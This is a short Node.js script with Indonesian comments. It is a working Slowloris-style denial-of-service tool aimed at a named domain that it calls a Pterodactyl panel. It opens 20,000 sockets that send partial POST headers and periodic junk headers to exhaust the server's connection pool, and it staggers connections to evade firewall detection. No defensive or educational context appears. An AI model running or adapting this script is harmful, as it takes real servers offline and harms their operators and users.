const net = require('net');

const TARGET_HOST = 'pteronet.my.id'; // IP atau Domain Panel //gunakan tanpa https://
const TARGET_PORT = 443; // Biasanya 80 atau 443
const CONNECTIONS = 20000; // Jumlah socket untuk menahan pool Nginx

const sockets = [];

function createSocket() {
    const socket = new net.Socket();
    
    socket.connect(TARGET_PORT, TARGET_HOST, () => {
        console.log(`[+] Connection Established: ${TARGET_HOST}`);
        
        // Mengirim partial header untuk menjaga koneksi tetap 'hanging'
        socket.write(`POST /auth/login HTTP/1.1\r\n`);
        socket.write(`Host: ${TARGET_HOST}\r\n`);
        socket.write(`Content-Length: 1000000\r\n`); // Berpura-pura mengirim data besar
        socket.write(`Content-Type: application/x-www-form-urlencoded\r\n`);
        socket.write(`User-Agent: Vanz-Asisten-Slowloris/2.0\r\n`);
    });

    socket.on('data', (data) => {
        // Abaikan respon
    });

    socket.on('error', (err) => {
        // Reconnect jika diputus oleh server
        setTimeout(createSocket, 500);
    });

    socket.on('end', () => {
        setTimeout(createSocket, 1000);
    });

    sockets.push(socket);
}

// Inisialisasi Massal
console.log(`[!] Attacking Pterodactyl Infrastructure: ${TARGET_HOST}`);
for (let i = 0; i < CONNECTIONS; i++) {
    setTimeout(createSocket, i * 50); // Staggering koneksi agar tidak terdeteksi firewall instan
}

// Keep-Alive Loop
setInterval(() => {
    sockets.forEach(s => {
        if (!s.destroyed) {
            s.write(`X-Keep-Alive: ${Math.random()}\r\n`); // Kirim junk header agar socket tidak timeout
        }
    });
}, 5000);
